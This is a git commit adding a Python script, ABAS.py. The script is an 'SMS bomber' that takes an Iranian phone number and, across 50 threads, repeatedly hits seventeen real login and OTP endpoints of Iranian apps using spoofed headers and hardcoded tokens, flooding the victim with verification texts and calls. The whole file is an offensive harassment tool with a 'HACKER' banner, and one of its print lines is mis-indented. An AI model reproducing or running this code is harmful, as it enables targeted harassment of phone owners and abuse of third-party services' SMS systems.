76f9e8e880c07d7350952402e69b8f23f4effda2
parsazx1383 <parsa.zx.1383@gmail.com>
2025-09-17 23:45:00 +0330

    Add files via upload

---
+++ ABAS.py
@@ -0,0 +1,375 @@
+from platform import node, system, release
+from os import system, name
+from re import match, sub
+from concurrent.futures import ThreadPoolExecutor
+import urllib3
+from time import sleep
+from requests import get, post, options
+
+
+def one(phone):
+    a = "http://app.insatel.ir/client_webservices.php"
+    b = f"ac=10&appname=fk&phonenumber={phone}&token=mw0yDKRVld&serial=null&keyname=verify2"
+    d = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Content-Length": "85",
+        "Host": "app.insatel.ir",
+        "Connection": "Keep-Alive",
+        "Accept-Encoding": "gzip",
+        "User-Agent": "okhttp/3.12.1"
+    }
+    try:
+        post(a, data=b, headers=d, timeout=5)
+    except:
+        pass
+
+def two(phone):
+    a = "http://setmester.com/mrfallowtel_glp/client_webservices4.php"
+    b = f"ac=9&username=gyjoo8uyt&password=123456&fullname=hkurdds6&phonenumber={phone}&token=1uhljuqBpI&serial=null"
+    d = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Content-Length": "110",
+        "Host": "setmester.com",
+        "Connection": "Keep-Alive",
+        "Accept-Encoding": "gzip",
+        "User-Agent": "okhttp/3.12.1"
+    }
+    try:
+        post(a, data=b, headers=d, timeout=5)
+    except:
+        pass
+
+def tree(phone):
+    a = "http://jozamoza.com/com.cyberspaceservices.yb/client_webservices4.php"
+    b = f"ac=9&username=sjwo7ehd&password=123456&fullname=dheoe9dy&phonenumber={phone}&token=qqcI33qkGC&serial=null"
+    d = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Content-Length": "109",
+        "Host": "jozamoza.com",
+        "Connection": "Keep-Alive",
+        "Accept-Encoding": "gzip",
+        "User-Agent": "okhttp/3.12.1"
+    }
+    try:
+        post(a, data=b, headers=d, timeout=5)
+    except:
+        pass
+
+def fwor(phone):
+    a = "https://api.nazdika.com/v3/account/request-login/"
+    b = f"phone={phone}"
+    d = {
+        "Accept": "Application/JSON",
+        "User-Agent": ",29;Xiaomi M90077J70CG;LTE",
+        "X-ODD-User-Agent": "Mozilla/9.0 (Linux; Android 10; M9007J540CG Build/QKQ1.97512.002; wv) AppleWebKit/9977.36 (KHTML, like Gecko) Version/4.0 Chrome/2000.0.4896.127 Mobile Safari/999.36",
+        "X-ODD-Operator": "IR-MCI,IR-MCI",
+        "X-ODD-SOURCE": "Nazdika-v-1140",
+        "X-ODD-MARKET": "googlePlay",
+        "X-ODD-IDENTIFIER": "null",
+        "X-ODD-ANDROID-ID": "lllllllllllll666llllllllll",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Content-Length": "17",
+        "Host": "api.nazdika.com",
+        "Connection": "Keep-Alive",
+        "Accept-Encoding": "gzip"
+    }
+    try:
+        post(a, data=b, headers=d, timeout=5)
+    except:
+        pass
+
+def five(phone):
+    a = "http://followmember2022.ir/followmember/client_webservices4.php"
+    b = f"ac=10&phonenumber={phone}&token=CLTRIcCmcT&serial=null"
+    d = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Content-Length": "58",
+        "Host": "followmember2022.ir",
+        "Connection": "Keep-Alive",
+        "Accept-Encoding": "gzip",
+        "User-Agent": "okhttp/3.12.1"
+    }
+    try:
+        post(a, data=b, headers=d, timeout=5)
+    except:
+        pass
+
+def six(phone):
+    a = "https://iranstor1.ir/index.php/api/login?sms.ir"
+    b = f"fullname=alimahmoodiu&mobile={phone}&device_id=12365478911&token=c5aef1158542ea0932c1916f829d943c"
+    d = {
+        "Host": "iranstor1.ir",
+        "key": "d41d8cd98f00b204e9800998ecf8427e",
+        "apptoken": "VdOIvN6tHdgjNrmCr0PvSg==:NTU1ZDBhNGNiODY0NzgyNA==",
+        "content-type": "application/x-www-form-urlencoded",
+        "content-length": "115",
+        "accept-encoding": "gzip",
+        "cookie": "ci_session=181bfd8fd175d83b156a57e477afc7edbc703522",
+        "user-agent": "okhttp/3.5.0"
+    }
+    try:
+        post(a, data=b, headers=d, timeout=5)
+    except:
+        pass
+
+def seven(phone):
+    a = "https://homa.petabad.com/customer/signup"
+    b = f"my_server_api_version=1&platform=android&my_app_type=android&my_app_version=17&time_zone_offset=270&app_name=customer&phone_number={phone}"
+    d = {
+        "user-agent": "Dart/2.14 (dart:io)",
+        "content-type": "application/x-www-form-urlencoded; charset=utf-8",
+        "accept-encoding": "gzip",
+        "content-length": "142",
+        "host": "homa.petabad.com"
+    }
+    try:
+        post(a, data=b, headers=d, timeout=5)
+				    print(f'{w}Petabad {g}Code Was sent')
+    except:
+        pass
+
+def eyit(phone):
+    a = "https://takhfifan.com/api/jsonrpc/1_0/"
+    b = {"id": 592419288011976410, "method": "customerExistOtp", "params": ["023804109885a10d02158eef65c5d887", {"username": phone}]}
+    d = {
+        "Host": "takhfifan.com",
+        "x-session": "023804109885a10d02158eef65c5d887",
+        "content-type": "takhfifanApp/json",
+        "content-length": "126",
+        "accept-encoding": "gzip",
+        "user-agent": "okhttp/3.14.9"
+    }
+    try:
+        post(a, json=b, headers=d, timeout=5)
+    except:
+        pass
+
+def niyne(phone):
+    a = "http://baharapp.xyz/api/v1.1/reqSMS.php"
+    b = f"phone={phone}&"
+    d = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 100; M2007J208CG MIUI/V12.0.9.0.QJGMIXM)",
+        "Host": "baharapp.xyz",
+        "Connection": "Keep-Alive",
+        "Accept-Encoding": "gzip",
+        "Content-Length": "18"
+    }
+    try:
+        post(a, data=b, headers=d, timeout=5)
+    except:
+        pass
+
+def ten(phone):
+    a = "http://serverpv1.xyz/api/v1/reqSMS"
+    b = f"phone={phone}&"
+    d = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 100; M2007J208CG MIUI/V12.0.9.0.QJGMIXM)",
+        "Host": "serverpv1.xyz",
+        "Connection": "Keep-Alive",
+        "Accept-Encoding": "gzip",
+        "Content-Length": "18"
+    }
+    try:
+        post(a, data=b, headers=d, timeout=5)
+    except:
+        pass
+
+def eleven(phone):
+    a = "http://kolbeapp.xyz/api/v1/reqSMS"
+    b = f"phone={phone}&"
+    d = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 100; M2007J208CG MIUI/V12.0.9.0.QJGMIXM)",
+        "Host": "kolbeapp.xyz",
+        "Connection": "Keep-Alive",
+        "Accept-Encoding": "gzip",
+        "Content-Length": "18"
+    }
+    try:
+        post(a, data=b, headers=d, timeout=5)
+    except:
+        pass
+
+def tovelf(phone):
+    a = "http://arezooapp.xyz/api/v1/reqSMS"
+    b = f"phone={phone}&"
+    d = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 100; M2007J208CG MIUI/V12.0.9.0.QJGMIXM)",
+        "Host": "arezooapp.xyz",
+        "Connection": "Keep-Alive",
+        "Accept-Encoding": "gzip",
+        "Content-Length": "18"
+    }
+    try:
+        post(a, data=b, headers=d, timeout=5)
+    except:
+        pass
+
+def therty(phone):
+    a = "http://servermv1.xyz/api/v1/reqSMS"
+    b = f"phone={phone}&"
+    d = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 100; M2007J208CG MIUI/V12.0.9.0.QJGMIXM)",
+        "Host": "servermv1.xyz",
+        "Connection": "Keep-Alive",
+        "Accept-Encoding": "gzip",
+        "Content-Length": "18"
+    }
+    try:
+        post(a, data=b, headers=d, timeout=5)
+    except:
+        pass
+
+def forty(phone):
+    a = "https://core.otaghak.com/odata/Otaghak/Users/ReadyForLogin"
+    b = {"userName": phone}
+    d = {
+        "Host": "core.otaghak.com",
+        "app-version": "235",
+        "app-version-name": "5.12.0",
+        "app-client": "guest",
+        "device-model": "POCO M2007J20CG",
+        "device-sdk": "29",
+        "user-agent": "app:5.12.0(235)@POCO M2007J20CG",
+        "content-type": "application/json; charset=UTF-8",
+        "content-length": "26",
+        "accept-encoding": "gzip"
+    }
+    try:
+        post(a, json=b, headers=d, timeout=5)
+    except:
+        pass
+
+def fifty(phone):
+    a = "https://gharar.ir/api/v1/users/"
+    b = {"phone": phone}
+    d = {
+        "Host": "gharar.ir",
+        "appversion": "1.5.4",
+        "content-type": "application/json; charset=UTF-8",
+        "content-length": "23",
+        "accept-encoding": "gzip",
+        "user-agent": "okhttp/4.9.2"
+    }
+    try:
+        post(a, json=b, headers=d, timeout=5)
+    except:
+        pass
+
+def sixty(phone):
+    a = "http://serverhv1.xyz/api/v1.1/reqSMS.php"
+    b = f"phone={phone}&"
+    d = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 100; M2007J208CG MIUI/V12.0.9.0.QJGMIXM)",
+        "Host": "serverhv1.xyz",
+        "Connection": "Keep-Alive",
+        "Accept-Encoding": "gzip",
+        "Content-Length": "18"
+    }
+    try:
+        post(a, data=b, headers=d, timeout=5)
+    except:
+        pass
+
+def sventtubf(phone):
+    headers = {
+        "Host": "cyclops.drnext.ir",
+        "accept-language": "fa",
+        "accept": "application/json, text/plain, */*",
+        "user-agent": "Mozilla/5.0 (Linux; Android 10; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
+        "origin": "https://panel.drnext.ir",
+        "sec-fetch-site": "same-site",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-dest": "empty",
+        "referer": "https://panel.drnext.ir/",
+        "accept-encoding": "gzip, deflate, br"
+    }
+    try:
+        get(f"https://cyclops.drnext.ir/v1/doctors/auth/check-doctor-exists-by-mobile?mobile={phone}", headers=headers, timeout=5)
+        options("https://cyclops.drnext.ir/v1/doctors/auth/send-verification-token", headers={**headers, "access-control-request-method": "POST", "access-control-request-headers": "content-type"}, timeout=5)
+        post("https://cyclops.drnext.ir/v1/doctors/auth/send-verification-token", json={"mobile": phone}, headers={**headers, "content-type": "application/json;charset=UTF-8", "content-length": "24"}, timeout=5)
+        options("https://cyclops.drnext.ir/v1/doctors/auth/call-verification-token", headers={**headers, "access-control-request-method": "POST", "access-control-request-headers": "content-type"}, timeout=5)
+        post("https://cyclops.drnext.ir/v1/doctors/auth/call-verification-token", json={"mobile": phone}, headers={**headers, "content-type": "application/json;charset=UTF-8", "content-length": "24"}, timeout=5)
+    except:
+        pass
+
+def is_phone(phone: str):
+    phone = sub(r"\s+", "", phone.strip())
+    if match(r"^\+989[0-9]{9}$", phone):
+        return phone
+    elif match(r"^989[0-9]{9}$", phone):
+        return f"+{phone}"
+    elif match(r"^09[0-9]{9}$", phone):
+        return f"+98{phone[1:]}"
+    elif match(r"^9[0-9]{9}$", phone):
+        return f"+98{phone}"
+    else:
+        return False
+
+def print_low(text):
+    for char in text:
+        print(char, end='', flush=True)
+        sleep(0.001)
+
+# لیست توابع برای ارسال درخواست‌ها
+functions = [one, two, tree, fwor, five, six, seven, eyit, niyne, ten, eleven, tovelf, therty, forty, fifty, sixty, sventtubf]
+
+# رنگ‌ها
+r = '\033[1;31m'
+g = '\033[32;1m'
+y = '\033[1;33m'
+w = '\033[1;37m'
+
+# نمایش لوگو
+print_low(f"""
+{g}..................................
+..................................
+..................................
+{w}..................................
+..................................
+..................................
+{r}..................................
+..................................
+..................................
+
+{y}𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐄𝐃 𝐁𝐘 : @𝐏𝐀𝐑𝐒𝐀_𝐆𝐓𝐈𝟔
+
+{g}ＩＲＡＮ --- ＨＡＣＫＥ�Ｒ
+{w}ＩＲＡＮ --- ＨＡＣＫＥＲ
+{r}ＩＲＡＮ --- ＨＡＣＫＥＲ
+{y} ＰＡＲＳＡ ＨＡＣＫＥＲ
+""")
+
+# دریافت ورودی شماره تلفن
+while True:
+    phone = is_phone(input(f'{g}[?] {w}Enter Phone Number {g}(+98) {r}- {w}'))
+    if phone:
+        break
+
+# دریافت تعداد درخواست‌ها
+try:
+    tedad = int(input(f'{r}[?] {g}Enter Number of Requests : '))
+except ValueError:
+    tedad = 0
+    print(f"{r}Invalid Input!")
+
+# تابع اصلی برای ارسال درخواست‌ها
+def send_requests(phone, count):
+    with ThreadPoolExecutor(max_workers=50) as executor:
+        for _ in range(count):
+            for func in functions:
+                executor.submit(func, phone)
+            sleep(0.01)  # تاخیر 0.01 ثانیه بین هر دور
+
+# اجرای برنامه
+try:
+    send_requests(phone, tedad)
+except KeyboardInterrupt:
+    print(f'{r}[-] User Exited')
+except Exception as e:
+    print(f'{r}[-] Error: {e}')
